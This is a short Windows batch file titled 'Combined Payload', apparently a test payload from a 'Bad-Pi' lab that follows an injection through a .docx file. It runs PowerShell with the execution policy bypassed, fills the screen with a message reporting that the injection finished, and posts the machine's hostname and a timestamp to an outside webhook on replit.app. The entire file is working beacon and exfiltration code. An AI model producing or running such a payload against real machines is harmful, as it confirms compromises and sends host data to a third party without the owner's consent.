@echo off
chcp 65001 >nul
title Combined Payload

set WEBHOOK_URL=https://eset-bot-sender--0xw1zard.replit.app/api/eset-webhook
set MSG_TEXT=Тестове повідомлення від Bad-Pi лабораторії

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Add-Type -AssemblyName System.Windows.Forms; ^
$f = New-Object Windows.Forms.Form; ^
$f.FormBorderStyle = 'None'; ^
$f.WindowState = 'Maximized'; ^
$f.BackColor = 'Black'; ^
$l = New-Object Windows.Forms.Label; ^
$l.Text = 'All is working. Injection via .docx file finished'; ^
$l.ForeColor = 'Red'; ^
$l.Font = New-Object System.Drawing.Font('Courier New', 48, [System.Drawing.FontStyle]::Bold); ^
$l.AutoSize = $false; ^
$l.TextAlign = 'MiddleCenter'; ^
$l.Dock = 'Fill'; ^
$f.Controls.Add($l); ^
$f.Add_KeyDown({ if($_.KeyCode -eq 'Escape') { $f.Close() } }); ^
$f.ShowDialog(); ^
$body = @{text='%MSG_TEXT%'; timestamp=(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'); hostname=$env:COMPUTERNAME} | ConvertTo-Json; ^
try { ^
    $response = Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -Body $body -ContentType 'application/json'; ^
    Write-Host '✅ Успіх. Сервер відповів:' $response ^
} catch { ^
    Write-Host '❌ Помилка:' $_.Exception.Message ^
}"

pause
